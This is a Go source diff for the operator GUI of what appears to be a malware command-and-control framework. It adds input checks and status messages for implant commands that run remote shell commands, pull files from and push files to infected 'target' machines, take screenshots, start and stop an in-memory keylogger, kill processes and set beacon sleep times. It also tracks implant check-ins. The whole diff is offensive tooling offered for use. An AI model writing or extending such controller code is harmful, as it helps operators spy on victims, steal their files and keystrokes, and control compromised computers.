@@ -7,12 +7,13 @@ import (
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/widget"
 	"log"
+	"strconv"
 	"strings"
 )
 
 var (
 	HelpMenuString           string
-	ImplantsInteractionMenus []*Common.ImplantInteractionMenu
+	ImplantsInteractionMenus map[string]*Common.ImplantInteractionMenu
 )
 
 func ParseImplantCommand(Command string) {
@@ -42,17 +43,12 @@ func ParseImplantCommand(Command string) {
 		cmd = CmdAndArgsString
 	}
 
-	if cmd == "help" && len(args) > 0 {
+	if cmd == "help" && len(args) == 1 {
 		subcmd = args[0]
 	}
 
-	for _, menu := range ImplantsInteractionMenus {
-		if menu.ImplantName == ImplantName {
-			menu.EntryBar.SetText("")
-			menuobj = menu
-			break
-		}
-	}
+	ImplantsInteractionMenus[ImplantName].EntryBar.SetText("")
+	menuobj = ImplantsInteractionMenus[ImplantName]
 
 	//save the previous text in the log.
 	if menuobj != nil {
@@ -216,47 +212,102 @@ func ParseImplantCommand(Command string) {
 
 	case "execute":
 		//execute a command on the implant.
+		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "exec":
+		//execute a command on the implant.
+		str := fmt.Sprintf("[*] Executing command %s on implant.\n", strings.Join(args, " "))
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "download":
 		//download a file from the target pc implant is infecting.
+		if len(args) < 2 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid download command.\n")
+			return
+		}
+		str := fmt.Sprintf("[*] Downloading file %s to location %s from implant.\n", args[0], args[1])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "upload":
 		//upload a file to the target pc implant is infecting.
+		if len(args) < 2 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid upload command.\n")
+			return
+		}
+		str := fmt.Sprintf("[*] Uploading file %s to location %s implant.\n", args[0], args[1])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "screenshot":
 		//take a screenshot of the desktop.
+		str := fmt.Sprintf("[*] Taking a screenshot of the desktop.\n")
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "keylogger":
+		if len(args) == 0 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid keylogger command.\n")
+			return
+		}
+		str := fmt.Sprintf("[*] %sing keylogger on implant.\n", args[0])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		//start / stop keylogger on implant. This will be a reflected application loaded into memory.
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "shutdown":
 		//kill the implant.
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[*] Killing the implant.\n")
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "sleep":
+		if len(args) == 0 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid sleep time.\n")
+			return
+		}
+		arg, err := strconv.Atoi(args[0])
+		if err != nil {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid sleep time.\n")
+			return
+		}
+		str := fmt.Sprintf("[*] Setting new sleep time on implant to %d seconds.\n", arg)
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		//set new sleep time on implant
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "list":
+		if len(args) == 0 {
+			args = append(args, ".")
+		}
+		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		//list all files in the current directory.
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "ls":
+		if len(args) == 0 {
+			args = append(args, ".")
+		}
+		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "dir":
-
+		if len(args) == 0 {
+			args = append(args, ".")
+		}
+		str := fmt.Sprintf("[*] Listing all files in the directory %s on the implant.\n", args[0])
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "cd":
+		if len(args) == 0 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid directory.\n")
+			return
+		}
 		//change directory on implant.
 		str := fmt.Sprintf("[*] Changing directory to %s on implant.\n", args[0])
 		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
@@ -279,6 +330,10 @@ func ParseImplantCommand(Command string) {
 		break
 	case "kill":
 		//kill a process on the implant.
+		if len(args) == 0 {
+			menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + "[error] invalid process id.\n")
+			return
+		}
 		str := fmt.Sprintf("[*] Killing process %d on implant.\n", args[0])
 		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + str)
 		SendImplantCommand(cmd, args, ImplantName)
@@ -374,7 +429,7 @@ func InteractWithImplant(FyneApp fyne.App) {
 
 	ImplantInteractionMenu.ImplantLog.SetText(HelpMenuString)
 
-	ImplantsInteractionMenus = append(ImplantsInteractionMenus, &ImplantInteractionMenu)
+	ImplantsInteractionMenus[ImplantName] = &ImplantInteractionMenu
 
 	//some fucking go wizardry to ensure that we can update our team's chat if we press enter with text in the chat entry field.
 	ImplantInteractionMenu.EntryBar = Common.NewCustomChatEntry(func(text string) {
@@ -402,6 +457,7 @@ func InteractWithImplant(FyneApp fyne.App) {
 
 func CreateImplantTable(Window fyne.Window, FyneApp fyne.App) *widget.Table {
 
+	ImplantsInteractionMenus = make(map[string]*Common.ImplantInteractionMenu)
 	Interact := fyne.NewMenuItem("Interact", func() { InteractWithImplant(FyneApp) })
 	menu := fyne.NewMenu("Implant Options", Interact)
 	PopUpMenu := widget.NewPopUpMenu(menu, Window.Canvas())
@@ -438,6 +494,7 @@ func ReregisterImplant(NewImplantData Common.ImplantTableData, index int) {
 
 }
 
+// TODO: Implement this function.
 func RemoveImplantFromTable() {
 
 }
@@ -470,6 +527,19 @@ func UpdateImplantHealth(ImplantData Common.ImplantTableData) {
 	for i := 0; i < count; i++ {
 		if Common.ImplantData[i].ImplantName == ImplantData.ImplantName {
 			Common.ImplantData[i].Health = ImplantData.Health
+			Common.ImplantTable.Refresh()
+			break
+		}
+	}
+}
+
+func UpdateImplantCheckin(ImplantData Common.ImplantTableData) {
+	//get the length of the number of current implants.
+	count := len(Common.ImplantData)
+
+	for i := 0; i < count; i++ {
+		if Common.ImplantData[i].ImplantName == ImplantData.ImplantName {
+			Common.ImplantData[i].LastCheckIn = ImplantData.LastCheckIn
 			Common.ImplantTable.Refresh()
 			break
 		}
